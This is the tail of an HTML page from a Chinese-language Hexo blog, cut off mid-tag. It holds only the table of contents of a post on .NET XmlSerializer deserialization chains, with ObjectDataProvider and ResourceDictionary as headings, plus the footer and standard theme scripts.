fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">基础链-XmlSerializer链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XmlSerializer%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">XmlSerializer序列化&#x2F;反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ObjectDataProvider"><span class="toc-number">3.0.1.</span> <span class="toc-text">ObjectDataProvider</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ResourceDictionary"><span class="toc-number">3.1.</span> <span class="toc-text">ResourceDictionary</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref:</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: #0D0101"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By ConsT27</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">怀念那一刹耀眼的火花</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>